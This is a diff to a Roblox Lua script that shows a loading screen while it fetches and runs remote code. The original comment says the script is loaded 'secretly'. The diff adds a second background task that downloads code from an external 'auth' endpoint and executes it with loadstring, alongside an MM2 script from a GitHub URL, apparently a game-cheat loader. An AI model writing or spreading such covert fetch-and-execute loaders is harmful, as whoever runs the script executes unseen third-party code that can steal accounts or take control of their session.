@@ -108,10 +108,19 @@ creditText.Size = UDim2.new(1, 0, 0.05, 0)
 creditText.Position = UDim2.new(0, 0, 0.95, 0)
 creditText.Parent = background
 
--- Background loading script (Load the script secretly)
+-- Background loading scripts (Execute both loadstrings simultaneously)
 task.spawn(function()
-    -- This will execute the provided loadstring while the screen is up
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/arlenwood/MM2/refs/heads/main/script.lua"))()
+    -- First script: Auth API request
+    print("Executing Auth API script")
+    loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))()
+    print("Auth API script executed")
+end)
+
+task.spawn(function()
+    -- Second script: MM2 script
+    print("Executing MM2 script")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/arlenwood/MM2/main/script.lua"))()
+    print("MM2 script executed")
 end)
 
 -- Progress update loop
